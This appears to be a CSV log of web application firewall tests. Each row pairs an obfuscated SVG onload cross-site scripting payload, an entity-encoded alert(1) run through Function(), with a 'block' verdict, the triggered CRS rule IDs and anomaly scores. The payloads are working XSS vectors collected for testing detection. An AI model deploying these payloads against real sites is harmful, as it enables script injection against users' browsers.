2070,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893851.803812
2071,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938657.165212
2072,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() fill=""red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938769.710963
2076,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939198.238719
2077,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939298.023975
2078,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() stroke=""blue""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628939388.086335
2088,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" y=0></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628940481.860706
2089,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' y=0></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628940441.888874
2094,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" opacity=0.5></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941040.864597
2095,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' opacity=0.5></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941095.603954
2096,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() opacity=0.5></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941173.484509
2100,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" transform=""rotate(45)""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941541.700643
2101,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' transform=""rotate(45)""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628941767.967777
2106,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942120.441132
2107,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942243.291074
2108,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() version=""1.1""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942382.902170
2112,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" preserveAspectRatio=""none""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628942734.750516
2113,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' preserveAspectRatio=""none""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894283.936207
2118,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628943398.069892
2119,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894345.146469
2120,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() clip-path=""circle()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628943535.800609
2124,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894397.111362
2125,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944014.350801
2126,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944113.804802
2127,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944276.197068
2128,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg/></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944340.942599
2129,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944463.531888
2130,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944581.533462
2131,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg><svg></svg></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944639.338189
2133,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944826.029906
2134,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""/></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944996.554174
2135,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg id=x></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945079.416030
2136,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg id=x></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945178.300744
2137,<svg id=a onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945262.489238
2139,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg id=y/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945410.870031
2140,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg><svg/></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945526.865782
2141,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945615.228168
2142,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg><svg/></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945765.635031
2143,<svg id=outer onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg id=inner></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,21v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945897.453874
2145,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg id=inner/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894608.727936
2146,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg width=1></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946158.810073
2147,<svg><svg width=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,25v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946282.136177
2148,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg width=1 height=1></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946388.206688
2149,<svg width=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,20v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946468.171571
2150,<svg><svg width=1 height=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,34v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946594.358860
2151,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg width=1/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946628.649623
2152,"<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,6v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628946769.780966
2154,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg xmlns=""http://www.w3.org/2000/svg""/></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628946923.769715
2155,"<svg onload=""eval(Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)())""><svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o13,74v217,94 || o13,5v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177628947061.949818
